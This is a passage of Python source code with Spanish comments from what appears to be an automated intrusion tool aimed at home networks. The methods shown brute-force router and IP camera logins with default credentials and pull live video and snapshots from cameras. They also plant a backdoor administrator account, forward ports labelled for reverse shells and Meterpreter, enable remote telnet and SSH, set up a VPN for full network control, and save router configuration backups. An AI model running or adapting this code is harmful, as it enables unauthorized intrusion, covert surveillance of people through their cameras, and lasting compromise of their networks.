                except Exception:
                    continue
            
            return camera_info
            
        except Exception as e:
            print(f"❌ Error obteniendo información de cámara: {e}")
            return {'error': str(e)}
    
    
    def _generate_camera_urls(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, List[str]]:
        """Generar URLs de acceso a la cámara"""
        urls = {
            'web_interface': [],
            'streaming': [],
            'snapshots': [],
            'control': []
        }
        
        base_url = f"http://{camera['host']}:{camera['port']}"
        auth_url = f"http://{credentials['username']}:{credentials['password']}@{camera['host']}:{camera['port']}"
        
        # Interfaz web
        urls['web_interface'] = [
            f"{auth_url}/",
            f"{auth_url}/index.html",
            f"{auth_url}/login.html",
            f"{auth_url}/main.html"
        ]
        
        # Streaming
        urls['streaming'] = [
            f"{auth_url}/video.mjpg",
            f"{auth_url}/mjpeg",
            f"{auth_url}/stream",
            f"{auth_url}/live"
        ]
        
        # Capturas
        urls['snapshots'] = [
            f"{auth_url}/snapshot.cgi",
            f"{auth_url}/image",
            f"{auth_url}/snapshot",
            f"{auth_url}/jpg"
        ]
        
        # Control
        urls['control'] = [
            f"{auth_url}/cgi-bin/ptz.cgi",
            f"{auth_url}/cgi-bin/control.cgi",
            f"{auth_url}/api/ptz",
            f"{auth_url}/control"
        ]
        
        return urls
    
    def _download_camera_video(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Optional[str]:
        """Descargar 5 segundos de video o 100MB como prueba de la cámara"""
        try:
            import subprocess
            import os
            import time
            
            host = camera['host']
            port = camera['port']
            username = credentials['username']
            password = credentials['password']
            
            # Crear directorio para videos
            video_dir = f"camera_videos_{int(time.time())}"
            os.makedirs(video_dir, exist_ok=True)
            
            # Generar nombre de archivo
            timestamp = int(time.time())
            video_filename = f"camera_{host}_{port}_video_{timestamp}.mp4"
            video_path = os.path.join(video_dir, video_filename)
            
            print(f"   📹 Descargando video de prueba de {host}:{port}...")
            
            # Intentar diferentes métodos de descarga de video
            video_downloaded = False
            
            # Método 1: RTSP stream con ffmpeg
            rtsp_url = f"rtsp://{username}:{password}@{host}:{port}/stream1"
            try:
                command = [
                    'ffmpeg', '-i', rtsp_url, '-t', '5', '-c', 'copy', 
                    '-f', 'mp4', video_path, '-y'
                ]
                result = subprocess.run(command, capture_output=True, timeout=30)
                if result.returncode == 0 and os.path.exists(video_path) and os.path.getsize(video_path) > 0:
                    video_downloaded = True
                    print(f"   ✅ Video descargado via RTSP: {video_filename}")
            except Exception as e:
                print(f"   ⚠️ RTSP falló: {e}")
            
            # Método 2: HTTP stream con ffmpeg
            if not video_downloaded:
                http_url = f"http://{username}:{password}@{host}:{port}/video.mjpg"
                try:
                    command = [
                        'ffmpeg', '-i', http_url, '-t', '5', '-c', 'copy', 
                        '-f', 'mp4', video_path, '-y'
                    ]
                    result = subprocess.run(command, capture_output=True, timeout=30)
                    if result.returncode == 0 and os.path.exists(video_path) and os.path.getsize(video_path) > 0:
                        video_downloaded = True
                        print(f"   ✅ Video descargado via HTTP: {video_filename}")
                except Exception as e:
                    print(f"   ⚠️ HTTP stream falló: {e}")
            
            # Método 3: Descarga directa de archivo de video
            if not video_downloaded:
                video_urls = [
                    f"http://{username}:{password}@{host}:{port}/video.mp4",
                    f"http://{username}:{password}@{host}:{port}/stream.mp4",
                    f"http://{username}:{password}@{host}:{port}/live.mp4"
                ]
                
                for video_url in video_urls:
                    try:
                        import urllib.request
                        with urllib.request.urlopen(video_url, timeout=10) as response:
                            data = response.read(100 * 1024 * 1024)  # 100MB máximo
                            if data:
                                with open(video_path, 'wb') as f:
                                    f.write(data)
                                video_downloaded = True
                                print(f"   ✅ Video descargado via HTTP directo: {video_filename}")
                                break
                    except Exception as e:
                        continue
            
            if video_downloaded and os.path.exists(video_path):
                file_size = os.path.getsize(video_path)
                print(f"   📊 Tamaño del video: {file_size / 1024 / 1024:.2f} MB")
                return video_path
            else:
                print(f"   ❌ No se pudo descargar video de {host}:{port}")
                return None
                
        except Exception as e:
            print(f"   ❌ Error descargando video: {e}")
            return None
    
    def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
        """Capturar screenshots de prueba de la cámara"""
        screenshots = []
        
        try:
            import urllib.request
            import os
            import time
            
            # Crear directorio para screenshots
            screenshot_dir = f"camera_screenshots_{int(time.time())}"
            os.makedirs(screenshot_dir, exist_ok=True)
            
            host = camera['host']
            port = camera['port']
            
            print(f"📸 Capturando screenshots de prueba de {host}...")
            
            # URLs comunes para captura de imagen
            snapshot_urls = [
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot.cgi",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/image",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpg",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpeg",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/cgi-bin/snapshot.cgi",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/axis-cgi/jpg/image.cgi"
            ]
            
            screenshot_count = 0
            
            for i, url in enumerate(snapshot_urls):
                if screenshot_count >= 2:  # Solo 2 screenshots de prueba
                    break
                    
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=10) as response:
                        if response.status == 200:
                            # Verificar que sea una imagen
                            content_type = response.headers.get('Content-Type', '')
                            if 'image' in content_type or 'jpeg' in content_type or 'jpg' in content_type:
                                screenshot_file = os.path.join(screenshot_dir, f"{host}_screenshot_{screenshot_count + 1}.jpg")
                                
                                with open(screenshot_file, 'wb') as f:
                                    f.write(response.read())
                                
                                screenshots.append(screenshot_file)
                                screenshot_count += 1
                                
                                print(f"   ✅ Screenshot {screenshot_count}: {screenshot_file}")
                                
                                # Pequeña pausa entre capturas
                                time.sleep(1)
                            
                except Exception as e:
                    continue
            
            if screenshots:
                print(f"✅ Capturados {len(screenshots)} screenshots de {host}")
            else:
                print(f"⚠️ No se pudieron capturar screenshots de {host}")
            
            return screenshots
            
        except Exception as e:
            print(f"❌ Error capturando screenshots: {e}")
            return []
    
    def _access_router_and_configure_persistence(self) -> List[Dict[str, Any]]:
        """Acceder al router y configurar persistencia de red"""
        router_access = []
        
        try:
            # Obtener gateway detectado
            gateway = self.network_config.get('gateway')
            if not gateway:
                print("❌ No se detectó gateway para acceso al router")
                return router_access
            
            print(f"🌐 Intentando acceso al router: {gateway}")
            
            # Detectar tipo de router
            router_type = self._detect_router_type(gateway)
            
            # Intentar credenciales por defecto
            router_credentials = self._brute_force_router_credentials(gateway)
            
            if router_credentials:
                # Configurar acceso persistente al router
                router_config = self._configure_router_persistence(gateway, router_credentials, router_type)
                
                router_access.append({
                    'gateway': gateway,
                    'router_type': router_type,
                    'credentials': router_credentials,
                    'configuration': router_config,
                    'timestamp': time.time()
                })
                
                print(f"✅ Acceso al router configurado: {gateway}")
            else:
                print(f"⚠️ No se encontraron credenciales para el router {gateway}")
                print(f"   🔄 Continuando con otros objetivos...")
                
                # Agregar entrada de router no accesible para el reporte
                router_access.append({
                    'gateway': gateway,
                    'router_type': router_type,
                    'credentials': None,
                    'configuration': None,
                    'status': 'no_credentials',
                    'timestamp': time.time()
                })
            
        except Exception as e:
            print(f"❌ Error accediendo al router: {e}")
        
        return router_access
    
    def _detect_router_type(self, gateway: str) -> str:
        """Detectar tipo de router usando explotador específico"""
        try:
            import sys
            import os
            sys.path.append(os.path.join(os.path.dirname(__file__), 'tools'))
            from tplink_exploiter import TPLinkExploiter
            
            # Crear explotador TP-Link
            tplink_exploiter = TPLinkExploiter()
            
            # Detectar si es TP-Link
            device_info = tplink_exploiter.detect_tplink_device(gateway, 80)
            
            if device_info.get('is_tplink'):
                print(f"   ✅ Dispositivo TP-Link detectado: {device_info.get('model', 'Unknown')}")
                return 'tplink'
            
            # Probar puerto 443 (HTTPS)
            device_info = tplink_exploiter.detect_tplink_device(gateway, 443)
            
            if device_info.get('is_tplink'):
                print(f"   ✅ Dispositivo TP-Link detectado (HTTPS): {device_info.get('model', 'Unknown')}")
                return 'tplink'
            
            # Si no es TP-Link, usar detección genérica
            import urllib.request
            
            # URLs comunes de routers
            router_urls = [
                f"http://{gateway}/",
                f"https://{gateway}/",
                f"http://{gateway}:8080/",
                f"https://{gateway}:8443/"
            ]
            
            for url in router_urls:
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=5) as response:
                        html_content = response.read().decode('utf-8', errors='ignore')
                        
                        # Detectar marcas de routers
                        if 'cisco' in html_content.lower():
                            return 'cisco'
                        elif 'netgear' in html_content.lower():
                            return 'netgear'
                        elif 'linksys' in html_content.lower():
                            return 'linksys'
                        elif 'tp-link' in html_content.lower() or 'tplink' in html_content.lower():
                            return 'tp-link'
                        elif 'd-link' in html_content.lower() or 'dlink' in html_content.lower():
                            return 'd-link'
                        elif 'asus' in html_content.lower():
                            return 'asus'
                        elif 'belkin' in html_content.lower():
                            return 'belkin'
                        elif 'huawei' in html_content.lower():
                            return 'huawei'
                        elif 'zte' in html_content.lower():
                            return 'zte'
                        else:
                            return 'generic_router'
                            
                except Exception:
                    continue
            
            # Si no se puede detectar, usar detección por MAC vendor
            print(f"   ⚠️ No se pudo detectar tipo de router por HTTP, intentando por MAC...")
            return self._detect_router_type_by_mac(gateway)
            
        except Exception as e:
            print(f"❌ Error detectando tipo de router: {e}")
            print(f"   ⚠️ Usando detección por MAC como respaldo...")
            return self._detect_router_type_by_mac(gateway)
    
    def _detect_router_type_by_mac(self, gateway: str) -> str:
        """Detectar tipo de router usando MAC vendor como respaldo"""
        try:
            # Obtener hosts descubiertos del reconocimiento
            hosts = self.report['phase_1_reconnaissance'].get('hosts_discovered', [])
            
            for host in hosts:
                if host.get('ip') == gateway:
                    vendor = host.get('vendor', '').lower()
                    mac = host.get('mac', '')
                    
                    print(f"   🔍 Analizando MAC: {mac} - Vendor: {vendor}")
                    
                    # Mapear vendors a tipos de router
                    if 'huawei' in vendor:
                        print(f"   ✅ Router Huawei detectado por MAC")
                        return 'huawei'
                    elif 'cisco' in vendor:
                        print(f"   ✅ Router Cisco detectado por MAC")
                        return 'cisco'
                    elif 'tp-link' in vendor or 'tplink' in vendor:
                        print(f"   ✅ Router TP-Link detectado por MAC")
                        return 'tp-link'
                    elif 'netgear' in vendor:
                        print(f"   ✅ Router Netgear detectado por MAC")
                        return 'netgear'
                    elif 'linksys' in vendor:
                        print(f"   ✅ Router Linksys detectado por MAC")
                        return 'linksys'
                    elif 'asus' in vendor:
                        print(f"   ✅ Router Asus detectado por MAC")
                        return 'asus'
                    elif 'd-link' in vendor or 'dlink' in vendor:
                        print(f"   ✅ Router D-Link detectado por MAC")
                        return 'd-link'
                    elif 'belkin' in vendor:
                        print(f"   ✅ Router Belkin detectado por MAC")
                        return 'belkin'
                    elif 'zte' in vendor:
                        print(f"   ✅ Router ZTE detectado por MAC")
                        return 'zte'
                    else:
                        print(f"   ⚠️ Vendor desconocido: {vendor}, usando genérico")
                        return 'generic_router'
            
            # Si no se encuentra en hosts, usar genérico
            print(f"   ⚠️ No se encontró información de MAC para {gateway}, usando genérico")
            return 'generic_router'
            
        except Exception as e:
            print(f"❌ Error en detección por MAC: {e}")
            return 'generic_router'
    
    def _brute_force_router_credentials(self, gateway: str) -> Optional[Dict[str, str]]:
        """Fuerza bruta específica para routers con credenciales dirigidas"""
        try:
            import urllib.request
            import base64
            
            # Detectar tipo de router primero
            router_type = self._detect_router_type(gateway)
            print(f"   🎯 Router detectado: {router_type}")
            
            # URLs comunes de login de routers
            login_urls = [
                f"http://{gateway}/login.html",
                f"http://{gateway}/login.cgi",
                f"http://{gateway}/cgi-bin/login.cgi",
                f"http://{gateway}/admin/login.html",
                f"https://{gateway}/login.html",
                f"https://{gateway}/login.cgi"
            ]
            
            # Usar credenciales específicas según el tipo de router
            users_to_try = self.config['router_users'].copy()
            passwords_to_try = self.config['router_passwords'].copy()
            
            if router_type == 'huawei':
                print("   🎯 Usando credenciales específicas para Huawei...")
                users_to_try.extend(self.config_data['credentials']['router_users_huawei'])
                passwords_to_try.extend(self.config_data['credentials']['router_passwords_huawei'])
            elif 'tplink' in router_type.lower():
                print("   🎯 Usando credenciales específicas para TP-Link...")
                users_to_try.extend(self.config_data['credentials']['tplink_users'])
                passwords_to_try.extend(self.config_data['credentials']['tplink_passwords'])
            elif router_type == 'generic_router':
                print("   🎯 Usando credenciales genéricas para router...")
                # Agregar credenciales genéricas comunes
                users_to_try.extend(['admin', 'root', 'user', 'administrator', 'guest'])
                passwords_to_try.extend(['admin', 'password', '1234', '12345', '123456', '', 'root', 'user'])
            else:
                print(f"   🎯 Usando credenciales estándar para {router_type}...")
            
            # Limitar número de intentos para evitar timeouts largos
            max_attempts = 50
            attempt_count = 0
            
            for login_url in login_urls:
                if attempt_count >= max_attempts:
                    print(f"   ⚠️ Límite de intentos alcanzado ({max_attempts}), continuando...")
                    break
                    
                for username in users_to_try:
                    if attempt_count >= max_attempts:
                        break
                        
                    for password in passwords_to_try:
                        if attempt_count >= max_attempts:
                            break
                            
                        attempt_count += 1
                        print(f"   🔑 Intentando {username}:{password} ({attempt_count}/{max_attempts})")
                        
                        try:
                            # Crear autenticación básica
                            auth_string = f"{username}:{password}"
                            auth_bytes = auth_string.encode('ascii')
                            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                            
                            # Intentar acceso
                            req = urllib.request.Request(login_url)
                            req.add_header('Authorization', f'Basic {auth_b64}')
                            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                            
                            with urllib.request.urlopen(req, timeout=3) as response:
                                if response.status == 200:
                                    # Verificar si realmente accedió
                                    content = response.read().decode('utf-8', errors='ignore')
                                    if 'dashboard' in content.lower() or 'admin' in content.lower() or 'status' in content.lower():
                                        print(f"✅ Credenciales de router encontradas: {username}:{password}")
                                        return {'username': username, 'password': password}
                                        
                        except urllib.error.HTTPError as e:
                            if e.code == 401:  # Unauthorized
                                continue
                        except Exception as e:
                            # Continuar sin mostrar errores individuales
                            continue
            
            print(f"   ⚠️ No se encontraron credenciales válidas para el router {gateway}")
            print(f"   📊 Intentos realizados: {attempt_count}")
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta de router: {e}")
            return None
    
    def _configure_router_persistence(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Dict[str, Any]:
        """Configurar persistencia en el router usando explotador específico"""
        try:
            config = {
                'port_forwarding': [],
                'vpn_server': None,
                'remote_access': [],
                'admin_user_created': False,
                'backup_config': None,
                'device_info': {}
            }
            
            print(f"🔧 Configurando persistencia en router {router_type}...")
            
            if router_type == 'tplink':
                # Usar explotador específico de TP-Link
                import sys
                import os
                sys.path.append(os.path.join(os.path.dirname(__file__), 'tools'))
                from tplink_exploiter import TPLinkExploiter
                
                tplink_exploiter = TPLinkExploiter()
                
                # Login al dispositivo
                username = credentials.get('username', 'admin')
                password = credentials.get('password', 'admin')
                
                if tplink_exploiter.login_tplink(gateway, 80, username, password):
                    print(f"✅ Login exitoso en TP-Link: {gateway}")
                    
                    # 1. Obtener información del dispositivo
                    device_info = tplink_exploiter.get_device_info(gateway, 80)
                    config['device_info'] = device_info
                    
                    # 2. Crear usuario administrativo
                    admin_user = 'backdoor_admin'
                    admin_pass = 'Backdoor_2024!'
                    if tplink_exploiter.create_admin_user(gateway, 80, admin_user, admin_pass):
                        config['admin_user_created'] = True
                        print(f"✅ Usuario administrativo creado: {admin_user}")
                    
                    # 3. Configurar port forwarding
                    port_rules = [
                        (2222, '192.168.1.100', 22),   # SSH
                        (3389, '192.168.1.100', 3389), # RDP
                        (8080, '192.168.1.100', 8080), # HTTP
                        (4444, '192.168.1.100', 4444)  # Meterpreter
                    ]
                    
                    for ext_port, int_ip, int_port in port_rules:
                        if tplink_exploiter.add_port_forward_rule(gateway, 80, ext_port, int_ip, int_port):
                            config['port_forwarding'].append({
                                'external_port': ext_port,
                                'internal_ip': int_ip,
                                'internal_port': int_port,
                                'protocol': 'TCP'
                            })
                            print(f"✅ Port forwarding configurado: {ext_port} -> {int_ip}:{int_port}")
                    
                    # 4. Habilitar gestión remota
                    if tplink_exploiter.enable_remote_management(gateway, 80, 8080):
                        config['remote_access'].append({
                            'type': 'remote_management',
                            'port': 8080,
                            'enabled': True
                        })
                        print(f"✅ Gestión remota habilitada en puerto 8080")
                    
                    # 5. Hacer backup de configuración
                    backup_file = f"tplink_backup_{gateway}_{int(time.time())}.bin"
                    if tplink_exploiter.backup_configuration(gateway, 80, backup_file):
                        config['backup_config'] = backup_file
                        print(f"✅ Backup de configuración creado: {backup_file}")
                    
                else:
                    print(f"❌ No se pudo hacer login en TP-Link: {gateway}")
                    return {'error': 'Login failed'}
            
            else:
                # Usar configuración genérica para otros routers
                config = self._configure_generic_router_persistence(gateway, credentials, router_type)
            
            return config
            
        except Exception as e:
            print(f"❌ Error configurando persistencia del router: {e}")
            return {'error': str(e)}
    
    def _configure_generic_router_persistence(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Dict[str, Any]:
        """Configurar persistencia en router genérico"""
        try:
            import urllib.request
            import urllib.parse
            
            config = {
                'port_forwarding': [],
                'vpn_server': None,
                'remote_access': [],
                'admin_user_created': False,
                'backup_config': None
            }
            
            print(f"🔧 Configurando persistencia en router genérico {router_type}...")
            
            # 1. Crear usuario administrativo persistente
            admin_user = self._create_router_admin_user(gateway, credentials, router_type)
            if admin_user:
                config['admin_user_created'] = True
                print(f"✅ Usuario administrativo creado: {admin_user}")
            
            # 2. Configurar port forwarding
            port_forwards = self._configure_port_forwarding(gateway, credentials, router_type)
            config['port_forwarding'] = port_forwards
            
            # 3. Configurar VPN server si está disponible
            vpn_config = self._configure_vpn_server(gateway, credentials, router_type)
            if vpn_config:
                config['vpn_server'] = vpn_config
                print(f"✅ VPN server configurado")
            
            # 4. Configurar acceso remoto
            remote_access = self._configure_remote_access(gateway, credentials, router_type)
            config['remote_access'] = remote_access
            
            # 5. Hacer backup de configuración
            backup = self._backup_router_config(gateway, credentials, router_type)
            if backup:
                config['backup_config'] = backup
                print(f"✅ Backup de configuración creado")
            
            return config
            
        except Exception as e:
            print(f"❌ Error configurando persistencia del router genérico: {e}")
            return {'error': str(e)}
    
    def _create_router_admin_user(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, str]]:
        """Crear usuario administrativo en el router"""
        try:
            import urllib.request
            import urllib.parse
            
            # Generar credenciales para usuario persistente
            persistent_user = f"svc_{gateway.replace('.', '_')}"
            persistent_pass = f"P@ssw0rd_{gateway.split('.')[-1]}!"
            
            # URLs para crear usuario según tipo de router
            user_creation_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
                'netgear': f"http://{gateway}/setup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
            }
            
            url = user_creation_urls.get(router_type, user_creation_urls['generic_router'])
            
            # Datos para crear usuario
            data = {
                'username': persistent_user,
                'password': persistent_pass,
                'confirm_password': persistent_pass,
                'privilege': 'admin',
                'action': 'add_user'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    return {
                        'username': persistent_user,
                        'password': persistent_pass,
                        'privilege': 'admin'
                    }
            
            return None
            
        except Exception as e:
            print(f"❌ Error creando usuario administrativo: {e}")
            return None
    
    def _configure_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
        """Configurar port forwarding en el router"""
        port_forwards = []
        
        try:
            # Puertos a abrir para acceso remoto usando configuración
            external_port = self.config_data['remote_access']['external_port']
            ssh_port = self.config_data['persistence']['ssh_port']
            vpn_port = self.config_data['persistence']['vpn_port']
            web_port = self.config_data['persistence']['web_port']
            
            # Configuración estratégica de port forwarding para máximo impacto
            # Priorizar acceso a servicios críticos y objetivos de alto valor
            ports_to_forward = [
                # Acceso directo a objetivos de alto valor identificados
                {'external': 33389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access - Windows Systems', 'target': '192.168.1.218'},
                {'external': 22222, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access - Linux Systems', 'target': '192.168.1.218'},
                {'external': 8080, 'internal': 80, 'protocol': 'TCP', 'description': 'Camera Web Interface', 'target': '192.168.1.218'},
                {'external': 8443, 'internal': 443, 'protocol': 'TCP', 'description': 'HTTPS Camera Access', 'target': '192.168.1.218'},
                
                # Acceso a servicios de red críticos
                {'external': 4444, 'internal': 4444, 'protocol': 'TCP', 'description': 'Reverse Shell Backdoor'},
                {'external': 5555, 'internal': 5555, 'protocol': 'TCP', 'description': 'PowerShell Backdoor'},
                {'external': 6666, 'internal': 6666, 'protocol': 'TCP', 'description': 'Python Backdoor'},
                
                # Acceso a servicios de administración
                {'external': 21, 'internal': 21, 'protocol': 'TCP', 'description': 'FTP Access'},
                {'external': 23, 'internal': 23, 'protocol': 'TCP', 'description': 'Telnet Access'},
                {'external': 5900, 'internal': 5900, 'protocol': 'TCP', 'description': 'VNC Access'},
                {'external': 445, 'internal': 445, 'protocol': 'TCP', 'description': 'SMB Access'},
                {'external': 135, 'internal': 135, 'protocol': 'TCP', 'description': 'RPC Access'},
                {'external': 139, 'internal': 139, 'protocol': 'TCP', 'description': 'NetBIOS Access'},
                
                # VPN para acceso completo a la red
                {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access - Full Network Control'},
                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Panel Access'}
            ]
            
            print(f"🔗 Configurando port forwarding...")
            
            for port_config in ports_to_forward:
                try:
                    # Configurar port forwarding según tipo de router
                    success = self._add_port_forward_rule(gateway, credentials, router_type, port_config)
                    
                    if success:
                        port_forwards.append({
                            'external_port': port_config['external'],
                            'internal_port': port_config['internal'],
                            'protocol': port_config['protocol'],
                            'description': port_config['description'],
                            'configured': True
                        })
                        print(f"   ✅ Puerto {port_config['external']} -> {port_config['internal']} configurado")
                    else:
                        print(f"   ❌ Falló configuración de puerto {port_config['external']}")
                        
                except Exception as e:
                    print(f"   ❌ Error configurando puerto {port_config['external']}: {e}")
                    continue
            
            return port_forwards
            
        except Exception as e:
            print(f"❌ Error configurando port forwarding: {e}")
            return []
    
    def _add_port_forward_rule(self, gateway: str, credentials: Dict[str, str], router_type: str, port_config: Dict[str, Any]) -> bool:
        """Agregar regla de port forwarding específica"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para port forwarding según tipo de router
            pf_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
                'netgear': f"http://{gateway}/port_forwarding.htm",
                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
            }
            
            url = pf_urls.get(router_type, pf_urls['generic_router'])
            
            # Datos para port forwarding
            data = {
                'action': 'add',
                'external_port': str(port_config['external']),
                'internal_port': str(port_config['internal']),
                'protocol': port_config['protocol'],
                'description': port_config['description'],
                'enabled': '1'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.status == 200
                
        except Exception as e:
            return False
    
    def _configure_vpn_server(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, Any]]:
        """Configurar VPN server en el router"""
        try:
            import urllib.request
            import urllib.parse
            
            print(f"🔐 Configurando VPN server...")
            
            # Solo algunos routers soportan VPN server
            vpn_supported = ['asus', 'netgear', 'tp-link']
            if router_type not in vpn_supported:
                print(f"   ⚠️ Router {router_type} no soporta VPN server")
                return None
            
            # Configuración VPN
            vpn_config = {
                'enabled': True,
                'protocol': 'OpenVPN',
                'port': 1194,
                'username': f"vpn_{gateway.replace('.', '_')}",
                'password': f"VPN_{gateway.split('.')[-1]}!",
                'server_ip': gateway
            }
            
            # URLs para configurar VPN según tipo de router
            vpn_urls = {
                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
                'netgear': f"http://{gateway}/vpn_setup.cgi",
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
            }
            
            url = vpn_urls.get(router_type)
            if not url:
                return None
            
            # Datos para configurar VPN
            data = {
                'action': 'enable',
                'protocol': 'openvpn',
                'port': '1194',
                'username': vpn_config['username'],
                'password': vpn_config['password'],
                'server_ip': gateway
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ VPN server configurado: {vpn_config['username']}")
                    return vpn_config
            
            return None
            
        except Exception as e:
            print(f"❌ Error configurando VPN server: {e}")
            return None
    
    def _configure_remote_access(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
        """Configurar acceso remoto al router"""
        remote_access = []
        
        try:
            print(f"🌐 Configurando acceso remoto...")
            
            # Habilitar acceso remoto HTTP/HTTPS
            remote_configs = [
                {'service': 'http', 'port': 80, 'enabled': True},
                {'service': 'https', 'port': 443, 'enabled': True},
                {'service': 'ssh', 'port': 22, 'enabled': True},
                {'service': 'telnet', 'port': 23, 'enabled': True}
            ]
            
            for config in remote_configs:
                try:
                    success = self._enable_remote_service(gateway, credentials, router_type, config)
                    
                    if success:
                        remote_access.append({
                            'service': config['service'],
                            'port': config['port'],
                            'enabled': True,
                            'access_url': f"{config['service']}://{gateway}:{config['port']}"
                        })
                        print(f"   ✅ Acceso remoto {config['service']} habilitado")
                    
                except Exception as e:
                    print(f"   ❌ Error habilitando {config['service']}: {e}")
                    continue
            
            return remote_access
            
        except Exception as e:
            print(f"❌ Error configurando acceso remoto: {e}")
            return []
    
    def _enable_remote_service(self, gateway: str, credentials: Dict[str, str], router_type: str, service_config: Dict[str, Any]) -> bool:
        """Habilitar servicio remoto específico"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para habilitar servicios remotos
            service_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/rules",
                'netgear': f"http://{gateway}/remote_management.htm",
                'linksys': f"http://{gateway}/cgi-bin/remote_access.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/remote_access.cgi"
            }
            
            url = service_urls.get(router_type, service_urls['generic_router'])
            
            # Datos para habilitar servicio
            data = {
                'action': 'enable',
                'service': service_config['service'],
                'port': str(service_config['port']),
                'enabled': '1'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.status == 200
                
        except Exception as e:
            return False
    
    def _backup_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[str]:
        """Hacer backup de la configuración del router"""
        try:
            import urllib.request
            import os
            import time
            
            print(f"💾 Creando backup de configuración...")
            
            # URLs para backup según tipo de router
            backup_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
                'netgear': f"http://{gateway}/backup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/backup.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/backup.cgi"
            }
            
            url = backup_urls.get(router_type, backup_urls['generic_router'])
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Solicitar backup
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status == 200:
                    # Crear directorio para backups
                    backup_dir = f"router_backups_{int(time.time())}"
                    os.makedirs(backup_dir, exist_ok=True)
                    
                    # Guardar backup
